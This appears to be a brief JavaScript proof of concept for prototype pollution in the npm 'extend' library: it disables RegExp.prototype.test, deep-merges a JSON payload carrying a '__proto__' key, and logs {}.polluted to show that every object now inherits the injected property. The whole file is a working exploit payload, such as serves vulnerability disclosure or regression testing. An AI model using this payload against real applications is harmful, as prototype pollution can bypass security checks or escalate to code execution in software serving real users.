RegExp.prototype.test = () => false;
let extend = require('extend');
let payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
var obj = {};
console.log({}.polluted);
extend(true, {}, payload);
console.log({}.polluted);